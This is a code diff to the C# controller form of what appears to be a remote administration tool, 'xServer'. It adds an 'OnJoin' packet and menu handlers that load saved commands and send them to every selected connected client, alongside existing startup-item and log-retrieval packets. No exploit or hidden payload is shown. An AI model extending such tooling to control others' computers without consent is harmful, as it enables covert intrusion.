@@ -134,6 +134,7 @@ namespace xServer.Forms
                 typeof (Core.Packets.ServerPackets.AddStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                 typeof (Core.Packets.ServerPackets.GetLogs),
+                typeof (Core.Packets.ServerPackets.OnJoin),
                 typeof (Core.Packets.ClientPackets.Initialize),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
@@ -237,12 +238,13 @@ namespace xServer.Forms
 
             if (!client.Value.IsAuthenticated)
             {
-                if (type == typeof (Core.Packets.ClientPackets.Initialize))
-                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize) packet);
+                if (type == typeof(Core.Packets.ClientPackets.Initialize))
+                {
+                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize)packet);
+                }
                 else
                     return;
             }
-
             if (type == typeof (Core.Packets.ClientPackets.Status))
             {
                 CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet);
@@ -762,6 +764,28 @@ namespace xServer.Forms
                     clients.Add(lstClients.SelectedItems[i].Tag as Client);
             }
             return clients.ToArray();
+        }
+
+        private void menuJoinCommands_Click(object sender, EventArgs e)
+        {
+            FrmOnJoin frm = new FrmOnJoin();
+            frm.ShowDialog();
+
+        }
+
+        private void runJoinCommandsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            // Load from settings just in case its a bit larger.
+            if (Core.Misc.OnJoinCommands.MainList.Count <= 0)
+                Core.Misc.OnJoinCommands.LoadFromSettings();
+
+            if (Core.Misc.OnJoinCommands.MainList.Count <= 0)
+                return;
+
+            foreach (Client client in GetSelectedClients())
+            {
+                new Core.Packets.ServerPackets.OnJoin(Core.Misc.OnJoinCommands.ToDictionary()).Execute(client);
+            }
         }
     }
 }
